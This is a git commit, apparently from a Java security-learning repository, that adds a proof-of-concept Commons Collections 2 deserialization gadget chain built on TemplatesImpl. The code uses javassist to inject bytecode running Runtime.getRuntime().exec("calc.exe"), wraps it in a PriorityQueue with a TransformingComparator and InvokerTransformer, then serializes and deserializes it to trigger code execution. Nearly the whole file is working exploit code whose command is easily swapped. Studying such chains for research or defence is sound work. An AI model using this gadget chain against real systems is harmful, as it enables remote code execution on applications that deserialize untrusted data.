22a7ff5734dbc10e54e186fde998411ebe9d37bc
FFreestanding <62629010+FFreestanding@users.noreply.github.com>
2023-02-05 15:26:19 +0800

    CC2_add
    CC2新加一条链子，https://github.com/Y4tacker/JavaSec/blob/main/2.%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%93%E5%8C%BA/%E4%BD%BF%E7%94%A8TemplatesImpl%E6%94%B9%E9%80%A0CommonsCollections2/%E4%BD%BF%E7%94%A8TemplatesImpl%E6%94%B9%E9%80%A0CommonsCollections2.md

---
+++ CC2/src/CC2_TemplatesImpl.java
@@ -0,0 +1,51 @@
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.util.Comparator;
+import java.util.PriorityQueue;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import javassist.ClassPool;
+import javassist.CtClass;
+import org.apache.commons.collections4.Transformer;
+import org.apache.commons.collections4.comparators.TransformingComparator;
+import org.apache.commons.collections4.functors.InvokerTransformer;
+
+public class CC2_TemplatesImpl {
+    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
+        Field field = obj.getClass().getDeclaredField(fieldName);
+        field.setAccessible(true);
+        field.set(obj, value);
+    }
+
+    public static void main(String[] args) throws Exception {
+        TemplatesImpl obj = new TemplatesImpl();
+        setFieldValue(obj, "_bytecodes", new byte[][]{makeByteCode()});
+        setFieldValue(obj, "_name", "HelloTemplatesImpl");
+        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
+        Transformer transformer = new InvokerTransformer("toString", null, null);
+
+        Comparator comparator = new TransformingComparator( transformer);
+
+        PriorityQueue queue = new PriorityQueue(2, comparator);
+        queue.add(obj);
+        queue.add(obj);
+
+        setFieldValue(transformer, "iMethodName", "newTransformer");
+
+        FileStream.writeSer(queue,"CC2_TemplatesImpl.ser");
+
+        FileStream.readSer("CC2_TemplatesImpl.ser");
+    }
+    public static byte[] makeByteCode() throws Exception{
+        ClassPool pool = ClassPool.getDefault();
+        CtClass ctClass = pool.get(MyTemplate.class.getName());
+        String cmd = "Runtime.getRuntime().exec(\"calc.exe\");";
+        ctClass.makeClassInitializer().insertBefore(cmd);
+        ctClass.setName("NormalClass");
+        return ctClass.toBytecode();
+    }
+}
